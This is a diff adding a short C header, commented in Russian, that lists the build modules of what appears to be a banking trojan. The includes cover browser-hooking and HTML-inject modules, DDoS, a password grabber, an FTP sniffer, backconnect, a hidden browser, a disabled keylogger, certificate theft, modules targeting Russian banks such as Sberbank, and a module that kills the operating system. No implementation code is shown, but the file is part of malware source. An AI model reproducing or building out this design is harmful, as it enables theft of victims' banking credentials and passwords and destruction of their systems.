@@ -1,0 +1,36 @@
+
+/*--------------------------------------------------------------------------*/
+//
+//  Модули сборки RU
+//
+/*--------------------------------------------------------------------------*/
+
+
+#include "InternetExplorer.h" // Обработка запросов InternetExplorer
+#include "Firefox.h"
+#include "Opera.h"
+
+#include "ddos.h"
+
+#include "KeepAlive.h"
+
+#include "BotConfig.h"     // Модуль включает HTML инжекты
+#include "BotCryptHTTP.h" // Шифрование отправляемых и принимаемых данных
+
+
+#include "Grabber.h" // Включение грабера паролей
+#include "FtpSniffer.h" // Перехват фтп трафика
+#include "coocksol.h" // Очистка куков ИЕ и ФФ
+#include "BackConnect.h" // Модуль обратной связи
+#include "StealthBrowser.h" // Скрытый браузер
+//#include "KeyLogger.h" // СЛогирование ввода с клавиатуры
+#include "Hunter.h" 
+
+#include "RuBnk\RuBnk.h" //Включение рубанка
+#include "CyberPlatDLL.h"
+
+#include "CertGrab.h"
+#include "bsssign.h"
+#include "RuBnk\Sber.h"
+#include "RuBnk\java_patcher.h"
+#include "KillOs_Reboot.h"
